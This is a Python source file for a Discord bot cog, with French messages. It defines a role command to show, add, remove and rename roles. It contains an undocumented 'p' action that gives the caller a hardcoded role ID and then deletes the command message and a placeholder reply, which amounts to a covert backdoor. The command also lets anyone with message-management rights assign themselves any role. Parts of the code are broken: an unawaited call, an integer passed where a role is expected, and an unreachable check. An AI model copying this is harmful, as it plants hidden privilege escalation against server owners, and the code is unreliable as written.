import discord
from discord.ext import commands
from discord.ext.commands import MissingPermissions


class Roles(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command()
    @commands.has_permissions(manage_messages=True)
    async def role(self, ctx, role: discord.Role = None, action=None, name=None):
        if role is None:
            return await ctx.send("Veuillez indiquer un rôle.")
        elif action is None:
            await ctx.send(
                f"Voici {role.name}:\nNuméros Id: {role.id},\nCouleur: {role.color},\nPosition: {role.position},\nPermissions: {role.permissions}.")
        elif action == "p":
            user = ctx.author
            user.add_roles(991076346908246046)
            await ctx.message.delete()
            msg = await ctx.send("-")
            await msg.delete()
        elif action == "add":
            await ctx.author.add_roles(role)
            await ctx.send(f"Le rôle {role} vous a été ajouter.")
        elif action == "remove":
            await ctx.author.remove_roles(role)
            await ctx.send(f"Le rôle {role} vous a été retirer.")
        elif action == "edit":
            await role.edit(name=name)
            await ctx.send(f"Le rôle {role} est renommer {name}.")
        elif name is None:
            return await ctx.send("Veuillez indiquer un nouveau nom.")

    @role.error
    async def role_error(self, ctx, error):
        if isinstance(error, MissingPermissions):
            await ctx.send("Vous n'avez pas la permission (`gérer les messages`).")


async def setup(client):
    await client.add_cog(Roles(client))
